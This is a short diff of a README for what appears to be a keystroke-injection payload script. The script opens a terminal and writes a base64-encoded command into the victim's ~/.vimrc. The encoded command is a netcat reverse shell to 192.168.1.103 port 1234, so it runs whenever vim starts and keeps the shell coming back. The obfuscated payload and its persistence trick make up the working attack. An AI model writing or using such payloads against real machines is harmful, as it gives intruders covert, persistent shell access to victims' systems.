@@ -22,8 +22,8 @@ NOTE : I suggest to use the website to encode in base64, because trying to do it
 ## Code
 
 ```bash
-layout("CH");
-typingSpeed(1, 2);
+layout("CH")
+typingSpeed(1, 2)
 press("CTRL ALT T")
 delay(1000)
 type("echo '!base64 -d <<< cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjEwMyAxMjM0ID4vdG1wL2Y= | sh' > ~/.vimrc")
